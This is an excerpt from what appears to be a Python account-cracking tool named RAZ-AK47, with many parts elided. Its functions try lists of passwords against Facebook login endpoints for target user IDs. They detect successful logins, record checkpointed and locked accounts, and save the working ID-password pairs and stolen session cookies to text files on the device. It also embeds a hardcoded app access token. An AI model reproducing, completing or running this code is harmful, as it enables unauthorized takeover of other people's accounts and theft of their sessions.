...
def fuckxx2():
        ...
        return ua
#-----------------------------------------------------#
sys.stdout.write('\x1b]2;RAZ-AK\x07')
#-----------------------------------------------------#
#-------------------------------#
logo = (f"""
 {G} AAA   KK  KK            44   7777777 
{G2} AAAAA  KK KK            444       777 
{G3}AA   AA KKKK   _____   44  4      777  
{G4}AAAAAAA KK KK         44444444   777   
{G5}AA   AA KK  KK           444    777    
{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m{XX}[\x1b[1;92m={XX}]\x1b[38;5;46m FILE NAME : /sdcard/raz.txt  etc..')
				linex()
				...
				try:
					...
					menu()
				clear()
				print(f'\x1b[1;92m{XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m METHOD FIRE')
				print(f'\x1b[1;92m{XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m METHOD BEST FIREX')
				print(f'\x1b[1;92m{XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m METHOD NORMAL FIRE')
				print(f'\x1b[1;92m{XX}[\x1b[1;92m4{XX}]\x1b[38;5;46m METHOD NORMAL FIREX')
				linex()
				...
				os.system('python AK-47.py')
			elif xd in ['2','02']:
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/NAEEMSHARIF21');menu()
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\033[1;91m[{G}RAHAT-M1\033[1;91m]\033[1;97m-\033[1;91m[{G}%s\033[1;91m]\033[1;97m-\033[1;91m[{G}OK:%s\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [RAZ-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAZ-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;91m [RAZ-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAZ-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\033[1;91m[{G}RAHAT-M2\033[1;91m]\033[1;97m-\033[1;91m[{G}%s\033[1;91m]\033[1;97m-\033[1;91m[{G}OK:%s\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Type': 'application/x-www-form-urlencoded'}
                        ...
                        if 'session_key' in po:
                                       ...
                                       # print(f' {G}<[{A}🍪{G}]> {A}'+cookies)
                                        #linex()
                                        open('/sdcard/RAZ-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/RAZ-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                       # if 'y' in pcp:
                                               # print(f'\r\r\x1b[1;31m [RIMON-CP] '+ids+' ● '+pas+'\033[1;97m')
                                                open('/sdcard/RAZ-LOCK.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
...
def ffb(ids,names,passlist):
    ...
    'viewport-width': '980',}
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m[RAZ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RAZ-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RIMON-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m[RAZ-CP] '+ids+' | '+pas+'\033[1;32m')
                                        open('/sdcard/RAZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def rimon(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\033[1;91m[{G}RAHAT-M4\033[1;91m]\033[1;97m-\033[1;91m[{G}%s\033[1;91m]\033[1;97m-\033[1;91m[{G}OK:%s\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
    ...
    'viewport-width': '980',}
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[RAZ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RAZ-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RIMON-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;91m[\033[1;92mRAZ-M1\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
    sys.stdout.flush()
    try:
        for pas in pwv:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f'\r\r{A}[{G1}RAZ-OK{A}]{G1} {uid} {A}|{G1} {pas}')
                    print(f'\r{G}[{A}COOKIE{G}] {A} '+coki)
                    #linex()
                    open('/sdcard/RAZ-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    ok.append(uid)
                    break
                if res == 'LOCK':
                    print(f'\r\033[1;31m[RAZ-CP] {uid} {A}|\033[1;31m {pas}')
                    open('/sdcard/RAZ-RANDOM-M1-CP.txt','a').write(uid+'|'+pas+'\n')
                    cp.append(uid)
                    break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    ...
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;91m[\033[1;92mRAZ-M2\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r \033[1;31m[{G}RAZ-OK💚\033[1;31m]{G1} '+ids+' \033[1;31m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {G}[{A}COOKIE{G}]==>>{A} '+kuki+'')
                linex()
                open('/sdcard/RAZ-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mRAZ-M3\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
            ua = random.choice(ugen)      
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\r [{G}RAZ-OK]{G} '+uid+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {R}[{G}COOKIE{R}]{G} : '+coki)
                open('/sdcard/RAZ-RANDOM-M3-OK.txt', 'a').write(uid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)                
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\033[1;30m[RAZ-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/RAZ-CP-RND.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
